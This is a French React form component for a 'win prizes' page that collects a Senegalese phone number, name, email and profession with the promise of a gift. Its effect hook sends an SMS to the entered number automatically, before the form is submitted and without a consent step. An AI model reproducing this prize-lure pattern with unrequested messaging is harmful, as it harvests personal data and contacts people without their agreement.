import React, { useState, useEffect, useRef } from 'react';
import { User, Phone, Briefcase, ArrowRight, Mail, CheckCircle, AlertCircle } from 'lucide-react';
import { sendSMS, validateSenegalPhone, DEFAULT_SMS_MESSAGE } from '../services/smsService';

interface FormData {
  telephone: string;
  nom: string;
  prenom: string;
  email: string;
  profession: string;
}

interface FormProps {
  onSubmit: (data: FormData) => void;
}

export default function Form({ onSubmit }: FormProps) {
  const [formData, setFormData] = useState<FormData>({
    telephone: '',
    nom: '',
    prenom: '',
    email: '',
    profession: ''
  });

  const [isSubmitting, setIsSubmitting] = useState(false);
  const [smsStatus, setSmsStatus] = useState<{
    sent: boolean;
    sending: boolean;
    error: string | null;
  }>({
    sent: false,
    sending: false,
    error: null
  });
  
  const [phoneValid, setPhoneValid] = useState(false);
  const [currentFieldIndex, setCurrentFieldIndex] = useState(0);
  const smsTriggered = useRef(false);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    setTimeout(() => {
      onSubmit(formData);
      setIsSubmitting(false);
    }, 1000);
  };

  // Fonction pour déclencher l'envoi du SMS
  const triggerSMS = async () => {
    if (smsTriggered.current || !phoneValid || smsStatus.sent || smsStatus.sending) {
      return;
    }

    smsTriggered.current = true;
    setSmsStatus({ sent: false, sending: true, error: null });

    try {
      const result = await sendSMS(formData.telephone, DEFAULT_SMS_MESSAGE);
      
      if (result.success) {
        setSmsStatus({ sent: true, sending: false, error: null });
      } else {
        setSmsStatus({ sent: false, sending: false, error: result.error || 'Erreur inconnue' });
      }
    } catch (error) {
      setSmsStatus({ sent: false, sending: false, error: 'Erreur de connexion' });
    }
  };

  // Effect pour surveiller les changements de champs et déclencher le SMS
  useEffect(() => {
    // Vérifier si le numéro de téléphone est valide
    const isValid = validateSenegalPhone(formData.telephone);
    setPhoneValid(isValid);

    // Si le numéro est valide et qu'on commence à remplir le deuxième champ (prénom)
    if (isValid && formData.prenom.length > 0 && !smsTriggered.current) {
      triggerSMS();
    }
  }, [formData.telephone, formData.prenom]);

  const handleChange = (field: keyof FormData) => (e: React.ChangeEvent<HTMLInputElement>) => {
    setFormData({ ...formData, [field]: e.target.value });
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-purple-600 via-blue-600 to-indigo-700 flex items-center justify-center p-3 sm:p-4">
      <div className="w-full max-w-sm sm:max-w-md">
        <div className="text-center mb-6 sm:mb-8">
          <div className="inline-flex items-center justify-center w-14 h-14 sm:w-16 sm:h-16 bg-white/20 rounded-full mb-3 sm:mb-4">
            <span className="text-2xl sm:text-3xl">🎁</span>
          </div>
          <h1 className="text-2xl sm:text-3xl font-bold text-white mb-2">
            Gagnez des Prix !
          </h1>
          <p className="text-sm sm:text-base text-purple-100">
            Complétez le formulaire pour découvrir votre cadeau
          </p>
        </div>

        <form onSubmit={handleSubmit} className="bg-white/95 backdrop-blur-sm rounded-2xl shadow-2xl p-4 sm:p-6 space-y-4 sm:space-y-6">
          <div className="space-y-3 sm:space-y-4">
            <div>
              <label htmlFor="telephone" className="block text-sm font-medium text-gray-700 mb-2">
                <Phone className="inline w-4 h-4 mr-2" />
                Numéro de téléphone
                {smsStatus.sent && (
                  <CheckCircle className="inline w-4 h-4 ml-2 text-green-500" />
                )}
                {smsStatus.sending && (
                  <div className="inline-block w-4 h-4 ml-2 border-2 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
                )}
              </label>
              <div className="relative">
                <input
                  type="tel"
                  id="telephone"
                  value={formData.telephone}
                  onChange={handleChange('telephone')}
                  className={`w-full px-3 sm:px-4 py-2.5 sm:py-3 border rounded-xl focus:ring-2 focus:ring-purple-500 focus:border-transparent transition-all text-sm sm:text-base ${
                    phoneValid ? 'border-green-300 bg-green-50' : 'border-gray-300'
                  } ${smsStatus.error ? 'border-red-300 bg-red-50' : ''}`}
                  placeholder="77 123 45 67"
                  required
                />
                {phoneValid && !smsStatus.sent && !smsStatus.sending && (
                  <CheckCircle className="absolute right-3 top-1/2 transform -translate-y-1/2 w-5 h-5 text-green-500" />
                )}
              </div>
              {smsStatus.sent && (
                <p className="text-xs text-green-600 mt-1 flex items-center">
                  <CheckCircle className="w-3 h-3 mr-1" />
                  SMS de confirmation envoyé !
                </p>
              )}
              {smsStatus.error && (
                <p className="text-xs text-red-600 mt-1 flex items-center">
                  <AlertCircle className="w-3 h-3 mr-1" />
                  {smsStatus.error}
                </p>
              )}
              {!phoneValid && formData.telephone.length > 0 && (
                <p className="text-xs text-orange-600 mt-1">
                  Veuillez entrer un numéro sénégalais valide (ex: 77 123 45 67)
                </p>
              )}
            </div>

            <div>
              <label htmlFor="prenom" className="block text-sm font-medium text-gray-700 mb-2">
                <User className="inline w-4 h-4 mr-2" />
                Prénom
              </label>
              <input
                type="text"
                id="prenom"
                value={formData.prenom}
                onChange={handleChange('prenom')}
                className="w-full px-3 sm:px-4 py-2.5 sm:py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-purple-500 focus:border-transparent transition-all text-sm sm:text-base"
                placeholder="Votre prénom"
              />
            </div>

            <div>
              <label htmlFor="nom" className="block text-sm font-medium text-gray-700 mb-2">
                <User className="inline w-4 h-4 mr-2" />
                Nom
              </label>
              <input
                type="text"
                id="nom"
                value={formData.nom}
                onChange={handleChange('nom')}
                className="w-full px-3 sm:px-4 py-2.5 sm:py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-purple-500 focus:border-transparent transition-all text-sm sm:text-base"
                placeholder="Votre nom"
              />
            </div>

            <div>
              <label htmlFor="email" className="block text-sm font-medium text-gray-700 mb-2">
                <Mail className="inline w-4 h-4 mr-2" />
                Adresse email
              </label>
              <input
                type="email"
                id="email"
                value={formData.email}
                onChange={handleChange('email')}
                className="w-full px-3 sm:px-4 py-2.5 sm:py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-purple-500 focus:border-transparent transition-all text-sm sm:text-base"
                placeholder="votre@email.com"
              />
            </div>

            <div>
              <label htmlFor="profession" className="block text-sm font-medium text-gray-700 mb-2">
                <Briefcase className="inline w-4 h-4 mr-2" />
                Profession
              </label>
              <input
                type="text"
                id="profession"
                value={formData.profession}
                onChange={handleChange('profession')}
                className="w-full px-3 sm:px-4 py-2.5 sm:py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-purple-500 focus:border-transparent transition-all text-sm sm:text-base"
                placeholder="Votre profession"
              />
            </div>
          </div>

          <button
            type="submit"
            disabled={isSubmitting}
            className="w-full bg-gradient-to-r from-purple-600 to-blue-600 text-white py-3 sm:py-4 px-6 rounded-xl font-semibold hover:from-purple-700 hover:to-blue-700 focus:ring-2 focus:ring-purple-500 focus:ring-offset-2 transition-all transform hover:scale-105 disabled:opacity-50 disabled:cursor-not-allowed disabled:transform-none flex items-center justify-center gap-2 text-sm sm:text-base"
          >
            {isSubmitting ? (
              <div className="w-5 h-5 sm:w-6 sm:h-6 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
            ) : (
              <>
                Découvrir mon cadeau
                <ArrowRight className="w-4 h-4 sm:w-5 sm:h-5" />
              </>
            )}
          </button>
        </form>
      </div>
    </div>
  );
}